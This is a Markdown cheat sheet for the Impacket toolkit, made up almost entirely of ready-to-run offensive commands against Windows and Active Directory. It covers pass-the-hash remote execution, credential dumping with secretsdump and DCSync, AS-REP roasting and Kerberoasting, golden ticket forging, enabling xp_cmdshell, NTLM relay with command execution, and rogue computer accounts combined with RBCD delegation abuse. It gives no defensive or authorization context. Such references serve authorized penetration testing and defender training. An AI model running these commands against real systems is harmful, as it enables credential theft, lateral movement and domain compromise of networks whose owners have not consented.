# Impacket

Python toolkit for network protocol interaction.

## Installation

```bash
pip install impacket

# Or from GitHub
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

---

## Remote Execution

### psexec.py
Creates a service and executes commands (leaves artifacts).
```bash
impacket-psexec domain/user:password@<target>
impacket-psexec domain/user@<target> -hashes :ntlm_hash
```

### wmiexec.py
Uses WMI for execution (more stealthy).
```bash
impacket-wmiexec domain/user:password@<target>
impacket-wmiexec domain/user@<target> -hashes :ntlm_hash
```

### smbexec.py
Similar to psexec but different approach.
```bash
impacket-smbexec domain/user:password@<target>
```

### atexec.py
Uses scheduled tasks for execution.
```bash
impacket-atexec domain/user:password@<target> "command"
```

### dcomexec.py
Uses DCOM for execution.
```bash
impacket-dcomexec domain/user:password@<target>
```

---

## Credential Dumping

### secretsdump.py
Dump credentials from SAM, LSA, and NTDS.

```bash
# Remote (needs admin)
impacket-secretsdump domain/admin:password@<target>
impacket-secretsdump domain/admin@<target> -hashes :ntlm_hash

# Domain Controller (DCSync)
impacket-secretsdump domain/admin:password@<DC_IP> -just-dc

# From local files
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Kerberos Tools

### GetNPUsers.py (AS-REP Roasting)
```bash
# Without creds (need username list)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With creds
impacket-GetNPUsers domain.local/user:password -request
```

### GetUserSPNs.py (Kerberoasting)
```bash
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt
```

### getTGT.py
Request TGT with password or hash.
```bash
impacket-getTGT domain.local/user:password
impacket-getTGT domain.local/user -hashes :ntlm_hash

# Use the ticket
export KRB5CCNAME=user.ccache
```

### getST.py
Request service ticket (with delegation).
```bash
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/user:password
```

### ticketer.py
Create golden/silver tickets.
```bash
# Golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
```

---

## SMB Tools

### smbclient.py
Interactive SMB client.
```bash
impacket-smbclient domain/user:password@<target>
> shares
> use SHARE
> ls
> get file
```

### smbserver.py
Create SMB share.
```bash
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user test -password test
```

---

## LDAP Tools

### GetADUsers.py
Enumerate domain users.
```bash
impacket-GetADUsers domain.local/user:password -all
```

---

## MSSQL Tools

### mssqlclient.py
Connect to MSSQL.
```bash
impacket-mssqlclient domain/user:password@<target>
impacket-mssqlclient domain/user:password@<target> -windows-auth

# Enable xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

---

## NTLM Relay

### ntlmrelayx.py
Relay captured NTLM authentication.
```bash
# Relay to SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to LDAP (for AD attacks)
impacket-ntlmrelayx -t ldap://DC_IP --delegate-access

# Execute command on relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

## Other Tools

### addcomputer.py
Add computer account to domain.
```bash
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'Password123' domain.local/user:password
```

### rbcd.py
Configure Resource-Based Constrained Delegation.
```bash
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write domain.local/user:password
```

---

## Kerberos Authentication

```bash
# Set ticket file
export KRB5CCNAME=user.ccache

# Use Kerberos auth (-k -no-pass)
impacket-psexec -k -no-pass domain.local/user@target.domain.local
impacket-wmiexec -k -no-pass domain.local/user@target.domain.local
```

---

## Quick Reference

| Tool | Purpose |
|:-----|:--------|
| `secretsdump` | Dump credentials |
| `psexec/wmiexec/smbexec` | Remote execution |
| `GetNPUsers` | AS-REP Roasting |
| `GetUserSPNs` | Kerberoasting |
| `ntlmrelayx` | NTLM relay |
| `getTGT/getST` | Kerberos ticket tools |
| `mssqlclient` | MSSQL interaction |
